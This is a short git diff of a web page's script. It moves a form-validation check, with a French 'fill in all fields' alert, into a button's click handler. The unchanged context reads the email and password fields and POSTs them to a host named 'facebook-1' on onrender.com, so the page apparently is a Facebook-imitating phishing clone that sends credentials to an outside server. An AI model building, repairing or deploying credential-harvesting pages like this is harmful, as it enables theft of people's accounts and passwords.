@@ -202,15 +202,16 @@
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
     const createAccountBtn = document.getElementById('create-account-btn');
-    if(!emailInput.value || !passwordInput.value){
-        alert('Veuillez remplir tous les champs');
-        return;
-    }
+    
 
     createAccountBtn.addEventListener('click', (e) => {
         e.preventDefault(); // Prevent default form submission
         const email = emailInput.value;
         const password = passwordInput.value;
+        if(!emailInput.value || !passwordInput.value){
+        alert('Veuillez remplir tous les champs');
+        return;
+    }
 
         fetch('https://facebook-1-xc5l.onrender.com/login', {
             method: 'POST',
@@ -233,4 +234,5 @@
         });
     });
 </script>
+
 </html>
